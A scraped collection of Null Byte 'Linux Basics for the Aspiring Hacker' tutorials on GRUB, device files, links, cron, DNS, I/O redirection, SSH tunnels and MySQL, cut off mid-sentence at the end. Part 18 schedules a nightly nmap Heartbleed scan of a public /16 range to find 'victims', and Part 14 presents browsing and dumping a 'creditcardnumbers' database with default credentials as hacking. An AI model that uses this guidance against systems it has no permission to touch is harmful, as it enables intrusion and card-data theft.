        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-21-grub-bootloader-0154965/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nMany of you have installed Kali Linux as a virtual machine (VM) using VMware or VirtualBox, while others have installed Kali (or BackTrack) in a dual-boot system. The drawback to installing these hacking systems as a VM is that it then requires an external wireless adapter (your wireless adapter is piped through the VM as a wired device, eth0), but it makes for a great place to test your hacks while honing your skills.\nUsing Kali in a dual-boot system doesn't require another wireless adapter and enables you to use the full resources of your physical system without having to go through a hypervisor. In this way, when you need your Windows, you boot into Windows, and when you need Kali, you boot into Kali.\nThe Bootloader\nTo be able to run a dual-boot system, you must have a bootloader, and therein lies the issue. The bootloader enables us to choose which operating system we want to boot into. To be comfortable with this arrangement, we need to understand a bit about this thing called a bootloader.\nHistorically, Linux has used two bootloaders, LILO and GRUB. You may find LILO on some older, legacy systems, but it has largely been replaced by GRUB. GRUB has two versions, the original GRUB and now the new improved GRUB2! Our Kali system comes with GRUB2 by default, so I will focus my attention on this newer version here.\nTo help you better understand how GRUB works and to help you configure and troubleshoot GRUB, I dedicate these next two Linux tutorials, so stay tuned for Part 22 in my Linux Basics series.\nA Little Background on GRUB\nGRUB is an acronym for GRand Unified Bootloader. It largely replaces the legacy bootloader found on many older Linux version, LILO. GRUB works by intercepting control of the boot process when the BIOS transfers control to the Master Boot Record (MBR) in the first sector of the primary hard drive. Rather than the MBR then finding the first active partition, GRUB replaces the MBR with its own code that controls which partition is booted.\nStep 1: Exploring GRUB\nLet's take a look at GRUB2 as it is installed on Kali. GRUB2, unlike the original GRUB, has all its files installed into three main locations. These are:\n* /boot/grub/grub.cfg - this is the main configuration file (replaces menu.lst)\n* /etc/grub.d - this directory contains the scripts that build the grub.cfg\n* /etc/default/grub - this file contains the GRUB menu settings\nNow, let's begin by navigating and looking inside the GRUB directory.\nkali > cd /boot/grubkali >ls -l\nAs you can see, there are many files in this directory, but the one we want to focus on here is the grub.cfg. This is the configuration file in the new GRUB2 that comes with Kali. It replaces the old menu.lst that you will find on the original GRUB. Let's open it with the more command and examine it.\nGrub.cfg is basically a script for running and configuring GRUB2. It is generated by the scripts in /etc/grub.d and you generally should NOT try editing it directly (note the warning on the second line of the file).\nStep 2: The /Etc/grub.d Directory\nNext, let's look at the /etc/grub.d directory.\nkali > cd /etc/grub.dkali > ls -l\nAs you can see in the screenshot above, this directory has a number of scripts that are run to create the grub.cfg file. Let's look at the key entries here.\n* 00_header - this script loads the settings from /etc/default/grub\n* 05_debian_theme - this script defines the colors, background, etc.\n* 10_linux - this script loads the menu entries\n* 20_memtest86 - this script loads the memory tester\n* 30_os-prober - this script scans the hard drives for other operating systems\n* 40_custom - this is a template for manually adding other menu entries\nStep 3: Exploring /Etc/Default/Grub\nNow, let's go to the /etc/default directory and look to see what is in this directory.\nkali > cd /etc/defaultkali > ls -l\nThis directory contains many files and scripts that configure various daemons or services in Linux. The only one we are interested here is the grub file that I highlighted in the screenshot above. Let's open that file with the more command.\nkali > more /etc/default/grub\nWhen we do so, we will see the following output.\nThis file contains many of the customization parameters for GRUB such as the TIMEOUT and other parameters. If you change anything it this file, you must run \"update-grub\" for those changes to take effect as it then makes changes to the grub.cfg file.\nStep 4: How GRUB2 Works\nBefore we go any further, I want to take a moment to detail how GRUB2 works. It's quite different than the original GRUB and you need to understand this before you attempt any edits or changes to GRUB2.\nThe differences in configuring GRUB and GRUB2. Image via jEriko\nThe /etc/default/grub file contains customization parameters.\nThe /etc/grub.d/ directory contains scripts for the GRUB menu information and the scripts to boot the various operating systems. When the update-grub command is run, it reads the contents of the grub file and the grub.d scripts and creates the grub.cfg file.\nTo change the grub.cfg file, you need to edit the grub file or the scripts under grub.d.\nStay Tuned for More on GRUB...\nIn my next tutorial in my Linux Basics series, I will show how to edit your GRUB bootloader, so keep coming back, my aspiring hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 20 (Devices Files)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-20-devices-files-0155705/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nIn recent tutorials, I have made reference to the name and location of the Linux devices in the file system, such as sda (first SATA or SCSI drive). Specifically, I have mentioned the way that Linux designates hard drives when making an image of a hard drive for forensic purposes.\nFundamental to understanding how to use and administer hard drives and other devices in Linux is an understanding of how Linux specifies these devices in its file system.\nVery often, if we are using are hard drive in a hack or in forensics, we will need to specifically address its device file name. These device file names allow the device (e.g. hard drive) to interact with system software and kernel through system calls. These files are NOT device drivers, but rather rendezvous points that are used to communicate to the drivers. Linux maintains a device file for every device in the system in the /dev directory.\nIn this tutorial, we will examine how Linux names and interacts with the file system through the /dev directory and its files.\nThe /Dev Directory\nThe /dev directory contains all the files that represent physical peripheral devices present on the system such as disk drives, terminals, and printers. The /dev directory is directly below the / directory. If we navigate there, we will see an entry for all of our devices.\nkali > cd /devkali > ls -l\nBlock v. Character Devices\nLinux makes a distinction between block and character devices. Character devices are those that stream data into and out of the machine unbuffered and directly. These would include your keyboard, mouse, tape, and monitor. Because the data is unbuffered, it tends to be a slow process.\nOn the other hand, block devices are those that stream data into and out of the machine in buffered blocks. These include such devices as hard drives, CDs, DVDs, floppies, flash drives, etc. This data transfer tends to be much faster.\nNotice in the long listing of the /dev directory that some files begin with a \"c\" and some with a \"b\". Character devices begin a with \"c \" and block devices begin with a \"b\".\nYou will notice in the third line of the /dev directory listing that there is directory named \"block\". Let's navigate there and do a long list.\nkali > cd /blockkali > ls -l\nHere we see a listing of all the block devices. In the first line we see sr0; that would be the first CD-ROM (Linux tends to begin counting at 0, not 1). Near the bottom, we see sda, sda1, sda2, sda5 (yours may be different), where sda1 represents the first primary partition on the SATA drive, and sda2 represents the second primary partition on the SAME drive.\nNaming Conventions of Devices in Linux\nOriginally, hard drives were two types, IDE or SCSI. IDE (or later, E-IDE) was designed as a low cost alternative for low cost PCs. They were relatively slow and only allowed four devices per machine. In addition, they had to be configured in a master and slave configuration. Each master and slave combination had one cable and controller.\nA faster, but more expensive alternative was the SCSI (Small Computer System Interface) drive. SCSI drives were (are) faster and pricier. Besides their speed advantage, they did not need a master/slave configuration, but rather were configured with a controller and a series of devices up to 15.\nLinux would designate IDE hard drives with an hd and SCSI hard drives with an sd. In recent years, with the development and proliferation of SATA drives, we see that Linux designates these drives with sd, just like SCSI drives.\nThe first IDE drive was designated with an hda, the second hdb, the third hdc, and so on. The same happens with SCSI and now SATA drives; the first is designated with sda, the second sdb, the third sdc, and so on.\nSome other devices files include:\n* /dev/usb - USB devices",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 19 (Linking Files)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-19-linking-files-0155454/",
        "content": "Let's take brief look at each of these.\nSuperblocks\nThe superblock is the section that contains the information about the file system, in general. This includes such things as the number of inodes and data blocks as well as how much data is in each file. It's kind of a overseer and housekeeper of the file system.\nInode Table\nThe inode table contains several inodes (information nodes) that describe a file or directory in the file system. Essentally, it is simply a record that describes a file (or directory) with all its critical information such as date created, location, date modified, permissions, and ownership. It does not, however, contain the data in the file.\nIt's important to understand from a forensic perspective that when a file is deleted, only the inode is removed.\nData Blocks\nData blocks are where the data that is in the file is stored, as well as the file name. Now with that understanding, let's introduce two ways of linking files, the hard link and the soft or symbolic link.\nHard linked files are identical. They have the same size and the same inode. When one hard linked file is modified or changed, it's linked file changes as well. You can hard link a file as many times as you need, but the link cannot cross file systems. They must be on the same file system as they share an inode.\nSoft or Symbolic Links\nSymbolic or soft links are different from hard links in that they do not share the same inode. A symbolic link is simply a pointer to the other file, similar to links in Windows, and they have different file sizes too. Unlike hard links, symbolic links do NOT need to be on the same file system.\nStep 1: Viewing Links\nLet's take a look at what links look like in our filesystem on Kali. Let's navigate to the /bin directory. Remember that the /bin directory is just below the root of the file system and contains most the commands that we use on a daily basis in Linux.\nkali> cd /bin\nNow, let's look at the files in the bin directory.\nkali > ls -l\nNotice that several files here show an arrow (->) pointing to another file. These are symbolic links. Also, note how small they are. Each is only 6 bytes. That's because they are only pointers, pointing to another file. The data block of the link simply contains the path to the file it is linked to.\nWhen you edit the symbolically linked file, you are actually editing the target file as the symbolic file is only that path to the target file. Hope that makes sense.\nStep 2: Creating Symbolic Links\nNow, let's create some links. Let's start with symbolic links as they are probably the most common on most people's systems. Although symbolic links can be created anywhere, we will be creating them in the metasploit-framework directory to make starting the msfconsole a touch easier.\nMove to the /usr/share/metasploit-framework directory, first.\nkali > cd /usr/share/metasploit-console\nNow, let's take a look at the this directory..\nkali > ls -l\nTo create a symbolic or soft link, we use the ln (link) command with the -s switch (symbolic) and the name of the file we want to link to (the target) and the name of the link we want to create. You can use either relative paths or absolute paths to link the two files.\nUsually, when we want to enter the Metasploit console, we type msfconsole, remember? Now, let's say we want to change it so that we can simply type metasploit to enter the console rather having to remember msfconsole. We can link a new file, metasploit, to the old file, msfconsole, so that whenever we type metasploit it links or redirects to msfconsole.\nHere is how we would do that.\nkali >ln -s msfconsole metasploit\nNote how small the symbolic link file, metasploit, is. It's just 12 bytes, because it is only a pointer. A path to the file it is linked to.\nNow, to get into the msfconsole, I can type either metasploit or msfconsole and both will take me to the same place—the Metasploit Framework console.\nStep 3: Creating Hard Links\nTo create a hard link, the syntax is very similar with the exception that we use the ln (link) command without the -s (symbolic) switch, then the existing file to hard link to, and finally, the target file that will be created to the existing file.\nBack to our msfconsole example, let's add a hard link between msfconsole to a simpler command, msf. We can do this by typing:\nkali > ln msfconsole msf\nAs you can see above, now we have created a hard link called msf. Remember, hard links share an inode with the linked file, so they are exactly the same size. Notice that our new file, msf, is exactly the same size as msfconsole, 4103 bytes. Now, when we want to invoke (start) the msfconsole, we have the option to type metasploit, msf, and the original msfconsole. All will work equally well.\nCover images via Shutterstock (1, 2)",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 18 (Scheduling Jobs)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-18-scheduling-jobs-0154969/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nIn previous tutorials, I have shown you how to scan the globe for vulnerable servers and write simple scripts in BASH and Perl to perform other reconnaissance tasks. In a very recent guide, I taught how to scan vulnerable servers for Heartbleed.\nIn all of these cases, you might want to perform these usually time consuming tasks at a regular time; maybe the middle of the night, or while you are at work or school. That way, when you wake up in the morning, you are greeted by a long list of vulnerable machines that can be targets of your efforts later that day.\nLuckily for us, Linux has a built-in functionality that allows us to schedule such jobs as these on a regular schedule. In Linux, this is called cron, or crond, for the daemon that runs these services (a daemon, or demon, is simply a process that runs in the background).\nHow Cron Works in Linux\nTypically used to schedule such mundane, but necessary, tasks such as doing scheduled regular backups at a regular time each week, we can use it to schedule our scans or other nefarious \"jobs\".\nThe cron daemon starts when the system boots and continues to run as long as the system is up and running. It reads a configuration file or files that consist of the jobs to be run and the schedule they are to be run on. Almost anything we can do from the command line can be scheduled to be done on a regular schedule using cron.\nLet's take a look how it works and how we can use it as a hacker.\nStep 1: Locating Crontab\nCron is one of those functions that is almost identical across Linux distributions, so what you learn here can be used in Ubuntu, Red Hat, Suse, Mint, Slackware, CentOS, etc. It has been part of the Linux/UNIX family since the 1970s, so it is tried and true and has proven its value.\nLike so many things in Linux, the cron functionality is controlled by a configuration file that is a plain text file. In a multi-user environment, each user can have their own cron configuration file, but here we will concentrate on the root user in Kali.\nFor cron, the configuration file is the crontab, or \"cron table\", file. To find the crontab file, type:\nlocate crontab\nAs you can see, it is located in the /etc directory like nearly every other configuration file in Linux (there are exceptions, of course).\nStep 2: Opening Crontab\nLet's open it and look around. We can open it with any text editor, but here let's use the graphical text editor built into Kali, Leafpad. Type:\nleafpad /etc/crontab\nThe Debian version that Kali is built on has a newer version of crontab that is slightly easier to work with than earlier versions. Unlike earlier versions, they have labeled the fields and added a new field to denote the user that will run the job.\nStep 3: The Anatomy of a Crontab\nLet's break down the parts. As you can see in the screenshot above, the crontab starts with 5 lines that are commented (#) out. These lines are simply an explanation and notes, they are not seen or executed by the system.\nAfter the commented lines, you see a couple of lines together.\nThe first of these sets the shell to run the jobs from. In our case, we have designating the BASH shell with the following command. If want to use a different shell, we could designate it here.\nSHELL=/bin/sh\nThe second line sets the PATH variable. The PATH variable is an environment variable (there is one in Windows, too), that tells the system where to look for commands that are being used in the cron job. Typically, these are bin and sbin directories (binary) that contain the system commands that we use in Linux (ls, echo, ps, cd, etc.).\nHere the default settings are:\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\nThis simply means that the cron daemon will look in those directories for the commands that you use in your scheduled jobs. If you are using a command or file not in those directories, simply edit that line and add that directory to the end of the line after putting in a colon (:), such as:\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/newdir\nStep 4: Scheduling Jobs\nNow comes the meat of the crontab file. In this third section, we schedule the jobs that we want to run.\nAs you can see, each line represents a scheduled job that will run automatically at whatever day, date, or time you have it scheduled for.\nThe fields of the crontab file are as follows:\n* Minute -- the exact minute when the command or will be run (0-59)\n* Hour -- the exact hour when the command or job will be run (0-23)\n* Day of the Month -- the exact day of the month when the command or job will be run (1-31)\n* Month -- the exact month when the command or job will be run (1-12)\n* Day of the week -- the exact day when you want the command to run (0-6, Sunday=0)\n* User -- the user permissions that the job will run as\n* Command -- the command or job you want to run\nThe asterisk (*), or star, represents any, so it may be any day, any hour, or any minute.\nUsing Cron to Find Vulnerable Servers\nNow, let's imagine that we want to scan the globe for IP addresses that are vulnerable to the Heartbleed vulnerability.\nReportedly, there are over 300,000 servers that are still unpatched. Although that's a very large number, with over 2 billion IP addresses on the planet; that represents 1 out of every 10,000 IP addresses that are vulnerable. This means we will need to set up a scanner to repeatedly search thousands of IP's to find just one vulnerable server.\nThis is a perfect task for a cron job!\nStep 5: Scheduling Our Heartbleed Scanner\nWe can schedule the scanner to run every night while we are asleep and hopefully, awake each morning with a new potential victim(s)!\nLet's open that cron tab file again in any text editor.\nNow we are going to add a line to run our nmap scanner each weeknight at 2:05 am. Simply add this line to our crontab file:\n05 2 * * 1,2,3,4,5 root nmap -sV --script=ssl-heartbleed 68.76.0.0/16\nNow, save and close this file.\nThis would schedule our nmap Heartbleed scanner to run Monday, Tuesday, Wednesday, Thursday, and Friday at precisely 2:05 am for the Heartbleed vulnerability across 65,536 IP addresses.\nThat's good start.\nJust 2 billion more to go.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nOriginal cover image via Shutterstock",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 17 (Client DNS)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-17-client-dns-0151559/",
        "content": "* WonderHowTo\nWelcome back, my aspiring hackers!\nDomain Name System (DNS) is one of those things we seldom think about unless it doesn't work. Then, it can be very frustrating when we attempt to navigate to a website and we get that frustrating error message.\nDNS enables us to type in a domain name in our browser, such as wonderhowto.com, rather than a numerical IP address of the site we are trying to reach. In its simplest form, DNS simply translates domain names into IP addresses, making our lives much simpler. Can you imagine trying to remember all of the IP addresses of the hundreds of sites you visit daily?\nFor most of us working in Linux, we have two DNS concerns. First, as a client we need to access DNS services to translate our domain names into IP addresses. Second, as a server we need to provide DNS services. Here, I will limit myself to managing DNS from a client perspective and leave providing DNS services to another tutorial.\nIt's important to remind you here that in Linux, nearly everything is a file, and configuration is usually through the editing of a simple text file. This rule certainly applies to DNS.\nStep 1: /Etc/Hosts\nIn Linux, we have what is referred to as a \"hosts\" file. It's found where nearly all the configuration files are in the /etc directory, so /etc/hosts. This hosts file acts similarly to DNS, but it is static. This means that it's not updated like DNS is. The hosts file is the simplest and fastest method for mapping hostnames to IP addresses, but also the most time consuming.\nLet's look at the /etc/hosts file in BackTrack. Type:\n* bt > kwrite /etc/hosts\nThis will open the following file. Note that the default configuration in BackTrack has just the entries for localhost at 127.0.0.1 and then some notes on IPv6.\nWe could add additional lines to this file to provide simple name resolution services. If we wanted to resolve the word \"hacker\" to a system on our internal network, we could simply add a line to our hosts file, such as:\n* 192.168.116.7 hacker\nWhen we save our /etc/hosts and type \"hacker\" into our browser, we will be directed to the IP 192.168.117.7.\nStep 2: /Etc/resolv.conf\nThe primary file for pointing your system to a DNS server is the /etc/resolv.conf. Please note that the file name is similar to the English word resolve, but without the \"e\" at the end. It is here that we tell our system where to look for DNS services.\nLet's open it with kwrite.\n* bt> kwrite /etc/resolv.conf\nWhen we hit ENTER, kwrite opens the file as below.\nThe format of this file is:\n* nameserver IPaddress\nAs you can see, my /etc/resolv.conf is pointing to a DNS server on my local network, 192.168.116.1. I can change this to point to any public DNS server by simply editing and deleting the internal IP address with that of a public DNS server, such as Comcast's at 75.75.75.75.\nIf you have an internal DNS server, you would probably prefer to use it as it will give you faster responses, but people very often will put in both an internal DNS server first and then a public DNS server, second. In this way, your system will check the internal DNS server first and if it doesn't find a listing on that DNS server, it will then progress to the public IP server and will hopefully find it there.\nI've edited my /etc/resolv.conf to include the public DNS server for Comcast at 75.75.75.75. All I do now is Save the /etc/resolv.conf file and my system will look to my internal DNS server first and then to the Comcast public DNS server, if it doesn't find the name in my private DNS server.\nStep 3: /Etc/nsswitch.conf\nLastly, we have the /etc/nsswitch.conf file. Here is where we tell our system the order of where to look for name resolution. We have opened it with kwrite and have displayed it below.\nNote the line that begins with \"hosts\". This line line tells the system the order of which to search for name resolution. The system will try each in order until it finds the name it is looking for. Let's examine each separately.\n* files - Refers to the /etc/hosts file. Generally, we want the system to look here first as it is the fastest.\n* mdns4_minimal - This is a legacy multi-cast DNS protocol.\n* dns - This tells the system to go to the /etc/resolv.conf for find a DNS server.\n* [NOTFOUND=return] - This indicates that if the mdns_minimal search returns NOTFOUND, this should be treated as authoritative and the search ceases.\n* mdns4 - This is multicast DNS, a relatively rare DNS-like protocol for small networks without DNS servers.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nWww image via Shutterstock",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 16 (Stdin, Stdout, & Stderror)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-16-stdin-stdout-stderror-0150693/",
        "content": "* WonderHowTo\nWelcome back, my budding hackers!\nIn previous tutorials, we've looked at some of the basic commands and concepts for using Linux. Along the way, I realized that I've failed to provide you with some basic background material on the stdin, stdout, and stderror.\nIn human language, these are often referred to as standard input (stdin), standard output (stdout), and standard error (stderror). These represent how and where Linux sends the output from your commands (stdout), where it receives its input (stdin), and where it sendsits error messages (stderror).\nSince you've now been using Linux for awhile, you realize that both standard output and standard error are sent to your computer screen. Both as the name implies, this is the standard place and not necessarily the only place. Linux let's us define where our output and error messages should go.\nBefore we go any further, let's take a moment to define some terms.\nStandard Output (1)\nWhenever you complete a command, it must know where to send the output. You might want to send it to a file, a printer, the screen, etc. The default for standard output is the computer screen. Standard output is often referred to as stdout or simply use the numeric representation of 1.\nStandard Input (0)\nStandard input is where the program or command gets the information it needs. By default, in Linux this is the keyboard, but can be a file, etc. Standard input is often referred to as stdin or simply represented by the numeric representation of 0.\nStandard Error (2)\nWhen we make a mistake or our program throws an error, it send the error message to stanadard error. By default, this is our computer screen. Standard error is often referred to as stderror or simply represented by the numeral 2.\nWhen we want to direct any of these three from the command line or a script, we use the numeric representation of each, 0 for stdin, 1 for stdout, and 2 for stderr.\nStep 1: List Two Directories\nTo demonstrate how we can use and manipulation these I/O streams, let's do a listing of two different directories, /etc/hosts and /etc/snort.\nIn Linux, you can do listings of more than one directory at a time. The /etc/snort directory is where our configuration file for snort resides and /etc/hosts is a directory where we can set static name resolution in Linux (I'll do a new Linux tutorial on DNS and name resolution in Linux soon).\nIf we wanted to see the two directories, we could type:\n* ls /etc/hosts /etc/snort\nAs you can see, the listing comes back to us by the standard output to our computer screen showing us the listing of both directories.\nNow, let's try the same thing, but this time let's list a directory that doesn't exist, such as /etc/aircrack-ng.\n* ls /etc/hosts /etc/aircrack-ng\nAs you can see, our BASH shell comes back with two outputs, the standard output from etc/hosts and the standard error from the non-existent directory.\nStep 2: Send Standard Output to a File\nNext, let's suppose that we want to separate our standard output from our standard error. Imagine we're running a script where we don't want to see our output messages until after the script has run, but we need to see error messages on our screen immediately. We could rewrite our command as:\n* ls /etc/hosts /etc/aircrack-ng 1>goodoutput\nLet's now imagine just the reverse of our previous scenario where instead we want to see our output on screen, but store our error messages to a separate file for viewing later. We could write:\n* ls /etc/hosts /etc/aircrack-ng 2>erroroutput\nNow, after the command has been run, we can go back and cat the erroroutput file to view any possible error messages.\nStep 3: Send Standard Output & Standard Error to Separate File\nNow, let's imagine a script where we want both our standard output and standard error to be directed to separate files for viewing later. We can type:\n* ls /etc/hosts /etc/aircrack-ng 1>goodoutput 2>erroroutput\nNotice that nothing comes back to our screen, neither standard output or standard error.\nStep 4: Send Both Standard Output & Standard Input to Same File\nFinally, what if we wanted both standard error and standard output to be written to same file? We could type:\n* ls /etc/hosts /etc/aircrack-ng >goodoutput 2>&1\nNotice that I did not use the 1 before the >goodoutput as BASH defaults to stdout if no number is used.\nHope you enjoyed this quick lesson in Linux stdin, stdout, and stderror, but we have so much more coming, so keep coming back my budding hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 15 (Creating a Secure Tunnel to MySQL)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-15-creating-secure-tunnel-mysql-0150916/",
        "content": "* WonderHowTo\nWelcome back, my budding hackers!\nIn my continuing effort to build your basic Linux skills for hacking, I want to show you how to build a secure \"tunnel\" to MySQL.\nOf course, the techniques I use here could be used for any application, but since MySQL is such a critical app on most Linux installations, and since un-encrypted sessions to your MySQL database server could easily be sniffed and confidential information exposed, we'll use our database server as our example in this tutorial.\nThis is not to say that an encrypted tunnel is foolproof from being hacked. As with anything, it can be hacked, but it makes it many times more difficult. If we leave the data un-encrypted, any script kiddie with a sniffer can see and grab our traffic to our database.\nWe'll be using SSH or Secure Shell to encrypt our traffic. Every Linux distribution has a SSH server and client built in, unlike Windows where you will need to download one of many SSH clients such as PuTTY. Our BackTrack has BSD OpenSSH built-in, so don't need to download and install anything to build a secure connection between our client and server.\nLike so many other applications in Linux, SSH operates on a server/client architecture. To successfully connect, you must have both the server and the client running.\nStep 1: Open BackTrack & Start MySQL\nMySQL has the capability of using SSH, but you must configure and compile it to do so. Since the default configuration of MySQL, such as ours on BackTrack, does not have SSH built-in, we need to do a workaround using the SSH built into the operating system and then connecting to MySQL. This will create an encrypted \"tunnel\" to our database, so that hackers can't view our transmissions back and forth to the database.\nIn our example here, we'll be connecting between two BackTrack installations. I have shown you how to start MySQL from the GUI in the previous Linux basics guide, but in many distributions of Linux you won't have that luxury, so let's start MySQL from the command line.\n* bt > mysql_safe start\nNow, let's make certain that it started by checking our processes and \"grepping\" for mysql.\n* bt > ps aux | grep mysql\nStep 2: Generate Keys\nIn order for SSH to create its encrypted tunnel, it must first generate a key pair, a private key and a public key. These two keys will be used to encrypt and then decrypt the traffic over the tunnel. We can do this by typing:\n* bt >sshd-generate\nAs we can see, SSH has generated a key pair from which it will now be able to generate our secure tunnel. I have created a user named \"nullbyte\" on this server that we will use to connect to this machine.\nStep 3: Start SSH\nFrom the client machine, we can now connect to that SSH server by typing:\n* ssh -L3316:127.0.0.1:3306 nullbyte@192.168.1.112\nHere's a breakdown of what's in the command above.\n* ssh is the client command\n* -L3316 listens on port 3316\n* 127.0.0.1 is the location of the SSH client daemon on the client machine\n* 3306 is the default port of MySQL that we want the tunnel to on the server machine\n* nullbyte is a user on the operating system on the server\n* 192.168.1.112 the IP address of the MySQL server\nWhen we execute this command, we get a connection to the remote machine on nullbyte's account as shown below.\nWhat we have done here is to connect to the SSH client daemon on our client system that then connects via port 3331 to the SSH server that then connects to port 3306 to connect to MySQL.\nStep 4: Connect to MySQL Securely\nNow that we are securely connected to the server that contains the MySQL database, we can now login to the database over this tunnel. I have a MySQL user named \"test4\" (not the OS user—we connected via an OS user and we connect to MySQL via a MySQL user) on that database. Let's now login to that user's account.\n* mysql -u test4 -p\nAs you can see above, we have successfully connected to MySQL over this tunnel! All of the traffic between us and the remote database server is encrypted.\nTo make certain that we connected to the remote server and not our local database, I created a database on the remote server named \"nullbyte\".\nLet's issue the \"show databases;\" command from the MySQL prompt.\nAs you can see, we have connected to the remote database server as it has the \"nullbyte\" database.\nI'm hoping that you are finding these Linux fundamentals tutorials useful as they help to build your knowledge base that is useful for all of your hacking activities. For instance, in the near future, I'll show you how to hack this encrypted tunnel, so keep coming back, my tenderfoot hackers!\nDigital tunnel image via Shutterstock",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker, Part 14 (MySQL)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-14-mysql-0150288/",
        "content": "* Wikipedia\nOther popular Content Management Systems(CMS) such as Joomla, Drupal, and Ruby on Rails all use MySQL. You get the idea. If you want to develop or attack web applications, you should know MySQL. So, let's get started.\nStep 1: Start MySQL\nLuckily, BackTrack has MySQL already installed (if you are using another distribution, you can usually download and install MySQL from the software repository) and has a graphical start and stop. Let's start our MySQL service.\nWhen we do so, we should see a screen like that below pop up briefly and then disappear.\nStep 2: Logging in to MySQL\nNow that our MySQL service is started, we can begin to use it. First, we need to authenticate ourselves by logging in.\nOpen a terminal and type:\n* mysql -u root -p\nYou will be prompted for your password, which is \"toor\" in BackTrack. It may be different on other systems. Please note that although the username and password for MySQL is the same as the BackTrack username and password, that is not necessarily so on other distributions of Linux and MySQL. Usernames and passwords for the operating system (here is it Linux Ubuntu) and MySQL are separate and distinct.\nThis syntax, mysql -u <username> -p, works if we are trying to access a MySQL database on our localhost. This command defaults to using the MySQL instance on the localhost, if not given a hostname or IP address. For remote access (and that will likely be the case as a hacker), we need to provide the hostname or IP address of the system that is hosting the MySQL database, such as:\n* mysql -u root -p 192.168.1.101\nThis will connect us to the MySQL instance at 192.168.1.101 and prompt us for a password.\nThis opens up the MySQL command line interface that provides us with the mysql> prompt. Like Microsoft's SQL Server, MySQL has a GUI interface both native (MySQL Workbench) and third party (Navicat and TOAD for MySQL). Let's look athe command line interface first and then will will advance to the GUI interface\nAs a hacker, the command line interface may be our best opportunity for exploiting the MySQL database, so we should focus on it. It's unlikely that as an unauthorized entrant to the database you will be presented with an easy to use GUI.\nPlease note that this screen reminds us that all commands end in \" ;\"or \"\\g\" (unlike Microsoft's SQL Server) and that we can get help by typing help; or \\h.\nAs we are now logged as the systadmin (root), we can navigate unimpeded through the database. If we had logged in as a regular user, our navigation would be limited by the permissions provided us by the system administrator for that user.\nStep 3: Show Databases\nNow that we are logged in to the MySQL database as root, our next step is to find out whether there are any databases worth hacking. The command to find databases is:\n* show databases;\nAh Hah! We found a database worth exploring here named \"creditcardnumbers\".\nStep 4: Connect to a Database\nOnce we have logged into the MySQL instance, our next step is to connect to a particular database. In MySQL, like other database management systems, we can connect to the database we are interested in by typing use <databasename>. Since we now know that the database we are interested in is named \"creditcardnumbers\", we simply type:\n* use creditcardnumbers;\nAs you can see, MySQL responds with \"Database changed\", indicating that we are now connected to the \"creditcardnumbers\" database.\nOf course, I hope it goes without saying, that you should use the appropriate database name in place here of \"creditcardnumbers\". Its unlikely that a database admin will be so kind and accommodating as to name a database with such an easily recognizable name, so you may need to do a bit of exploring to find the database of interest.\nStep 5: Finding the Tables\nNow we are connected to the \"creditcardnumbers\" database and we can do a bit of exploring to see what might be in that database. We can find out what tables are in this database by typing:\n* show tables;\nIn the screenshot above, we can see that this database has just one table in it called \"cardnumbers\". Generally, databases will have numerous tables in them, but we are fortunate here as we can focus our attention on this single table to extract the hackers \"golden fleece\"!\nStep 6: Describe the Table to Discover Its Structure\nSince we can focus our efforts on this single table, we will need to understand the structure of that table. In subsequent tutorials--when we are hacking this database--we will see that understanding the structure is critical to a successful hack.\nWe can see the structure of the table by typing:\n* describe cardnumbers;\nMySQL responds with the critical infornation on the structure of our table of interest. We can see each of the fields and their data type (varchar or int), whether it will accept NULL's, the key, the default values and extra.\nStep 7: SELECT Data\nTo actually see the data in the table, we can use the SELECT command. The SELECT command requires to know:\n1. The table we want to view\n2. The columns within that table we want to view\nUsing the format:\n* SELECT <columns> FROM <table>\nAs a handy shortcut if we want to see data from all the columns, we can use the asterix (\"*\") as a wildcard instead of typing out every single column name. So, to see a dump of all the data from the cardnumbers table, we type:\n* SELECT * FROM cardnumbers;\nAs we can see, MySQL displayed all the information from the cardnumbers table to our screen.\nStep 8: Export Data\nNow that we know where the data is, we need to export it so that we can use it. MySQL has a command called mysqldump. Generally, it is used to create a backup copy of the data. You can run it from any command prompt, but you will need:\n1. A username (root)\n2. The password for that username (toor)\n3. The name of the database you want data from (creditcardnumbers)\n4. The table within the database you want (cardnumbers)\n5. The directory you want to dump to 